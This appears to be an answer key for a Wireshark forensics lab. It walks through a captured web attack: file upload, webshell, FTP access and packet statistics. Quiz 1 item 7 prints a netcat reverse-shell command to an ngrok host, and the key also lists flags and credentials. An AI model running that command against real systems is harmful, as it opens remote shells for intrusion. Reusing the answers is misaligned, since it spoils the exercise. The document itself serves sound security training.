## Open wireshark with the provided file
You will need to look mostly for TCP transmission of packets. <br>
Browse through the packets to familiarize with the content and have a general idea of the environment.

<br>

## Quiz 1

1. What is the IP address for the vulnerable website? <br>
  `206.89.59.199` <br><br>
  First request was made to this IP.
  ![1-1 ip](https://user-images.githubusercontent.com/93029180/224778799-48a3b527-d247-407f-855d-6f649fb51460.png)
  

2. What is the name of the file with file upload functionality? (just the name, no relative location) <br>
  `fileupload1.php` <br><br>
  

3. What is the name of the first file uploaded? <br>
  `linux-sandwich-cracker-box.JPG` <br><br>


4. Looking at the webshell uploaded, what was its original name? <br>
  `another_obfuscated_phpshell.php` <br><br>


5. What is the relative location of the uploaded webshell? <br>
  `/uploads/shell.php` <br><br>


6. What was the first command executed using the webshell? <br>
  `whoami` <br><br>


7. What is the reverse shell command executed through the webshell? (before encoding) <br>
  `nc 0.tcp.eu.ngrok.io 17344 -e /bin/bash` <br><br>


8. What is the correct order? <br>
  `[protocol]://[host]:[port]/[path]?[query]#[fragment]` <br><br>


9. What type of web server was used? <br>
  `Apache/2.4.38` <br><br>

<br>

## Quiz 2

1. Which user have we been spawned as after getting the reverse shell? <br>
  `www-data` <br><br>


2. What is the flag you found after getting the reverse shell? <br> 
  `flag{way_to_go}` <br><br>


3. What version of FTP is used on the victim server? <br>
  `vsFTPd 3.0.3` <br><br>


4. What is the pair of credentials used for FTP login? <br>
  `ftpuser:flag` <br><br>


5. What is the first command executed on the ftp server? <br>
  `ls` <br><br>


6. How many files were available to retrieve from the ftp server? <br>
  `2` <br><br>


7. On what date were the FTP files retrieved? <br>
  `27 Dec` <br><br>


8. UDP packets; IPv6 packets; total number of packets; <br>
  `2; 3; 1057` <br><br>


9. How many seconds did the packet capture record? <br>
  `160` <br><br>
